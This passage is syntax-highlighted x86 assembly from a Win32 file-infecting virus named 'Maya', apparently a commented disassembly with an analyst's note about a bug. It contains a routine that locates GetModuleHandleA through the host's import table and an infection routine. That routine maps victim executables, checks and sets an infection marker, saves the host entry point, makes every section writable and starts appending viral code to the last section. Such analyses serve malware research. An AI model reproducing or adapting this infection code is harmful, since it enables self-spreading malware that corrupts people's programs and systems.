    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;return failure to caller</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;searches the host's imports for GetModuleHanldeA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_lookup_getmodulehandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get imagebase</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">         </span><span class="sc1">;host file must be exe  </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_return_failure</span><span class="sc0"> </span><span class="sc1">;but it isnt so abort</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;zero reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;ptr to PE head</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;into esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">         </span><span class="sc1">;is it a PE?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_return_failure</span><span class="sc0"> </span><span class="sc1">;nope,abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get imports rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">maya_lookup_getmodulehandle_dll_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;name rva of dll module</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'NREK'</span><span class="sc0">            </span><span class="sc1">;is module name 'KERN...'?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_dll_ok</span><span class="sc0">   </span><span class="sc1">;yes</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">             </span><span class="sc1">;next entry</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_dll_loop</span><span class="sc1">;check next</span><span class="sc0">
</span><span class="sc5">maya_lookup_getmodulehandle_dll_ok</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;import lookup table rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_ilt</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store ilt rva</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_return_failure</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;store ptr</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;zero reg</span><span class="sc0">
</span><span class="sc5">maya_lookup_getmodulehandle_function_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_return_failure</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_nextfunction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">repe</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">               </span><span class="sc1">;compare function names</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;match?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_done</span><span class="sc0"> </span><span class="sc1">;yes</span><span class="sc0">
</span><span class="sc5">maya_lookup_getmodulehandle_nextfunction</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle_function_loop</span><span class="sc0">   
</span><span class="sc5">maya_lookup_getmodulehandle_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;*4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_ilt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;got the add</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;so return to the caller</span><span class="sc0">
</span><span class="sc5">maya_lookup_getmodulehandle_return_failure</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;show that we failed</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;and return to the caller</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;file infection subroutine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_infect</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;@11F3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_successfull_infection</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;kill flag</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getfileattrs</span><span class="sc0">              </span><span class="sc1">;get file attr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_fileattrib</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">;ptr to filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">;normal attr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_setfileattrs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_openfile</span><span class="sc0">              </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_infect_restore_attr</span><span class="sc0">         </span><span class="sc1">;yes,abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getfsize</span><span class="sc0">  
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_infect_closefile</span><span class="sc0">            </span><span class="sc1">;yes,abort</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filesize_high_dword</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;file smaller</span><span class="sc0">
                                  </span><span class="sc1">; than 4 GB?      </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_infect_closefile</span><span class="sc0">           </span><span class="sc1">;nope abort</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filesize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;store filesize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_handle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filesize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get filesize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">maya_length</span><span class="sc4">+</span><span class="sc2">1000h</span><span class="sc0">           </span><span class="sc1">;add virus size+1000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_createfmap</span><span class="sc0">                </span><span class="sc1">;create file mapping</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_infect_closemap</span><span class="sc0">             </span><span class="sc1">;yes,abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_maphandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filesize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get size of victim</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">maya_length</span><span class="sc4">+</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_mapview</span><span class="sc0">               </span><span class="sc1">;MapViewOfFile()</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_infect_closemap</span><span class="sc0">             </span><span class="sc1">;yes,abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_mappedadd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;store ptr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;and load into esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">;EXE?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_infect_unmap</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'MW'</span><span class="sc0">         </span><span class="sc1">;WM in the checksum</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_infect_unmap</span><span class="sc0">                </span><span class="sc1">;field?(already inf'd)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'MW'</span><span class="sc0">         </span><span class="sc1">;mark infected</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;ptr to PE header</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;no PE header?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_infect_unmap</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">maya_filesize</span><span class="sc0">               </span><span class="sc1">;header located</span><span class="sc0">
</span><span class="sc1">;***                            ;beyond eof?</span><span class="sc0">
</span><span class="sc1">;bug:should be cmp eax,[ebp+maya_filesize] for proper operation</span><span class="sc0">
</span><span class="sc1">;***</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">maya_infect_unmap</span><span class="sc0">               </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_mappedadd</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get add of mapped</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;PE header</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">             </span><span class="sc1">;PE?    </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_infect_unmap</span><span class="sc0">               </span><span class="sc1">;nope abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_peptr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;store ptr to PE head</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get filealign</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filealign</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_entry_of_host</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get current host entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_olderva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get victim entry rva</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_entry_of_host</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">;*8 </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_peptr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;zero register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;get object count</span><span class="sc0">
</span><span class="sc5">maya_infect_setwbit</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;@1318</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0">        </span><span class="sc1">;set W bit of sections</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                 </span><span class="sc1">;next section...</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">maya_infect_setwbit</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                 </span><span class="sc1">;ptr to last entry  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_ptrtolastsection</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;store it   </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;ptr into edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get section PhysSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_sectps</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;plus section rva</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_rva_of_viral_section</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;patch code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_sectrva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get section PhysOffs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_mappedadd</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get ptr to raw</span><span class="sc0">
                            </span><span class="sc1">;data of last section</span><span class="sc0">
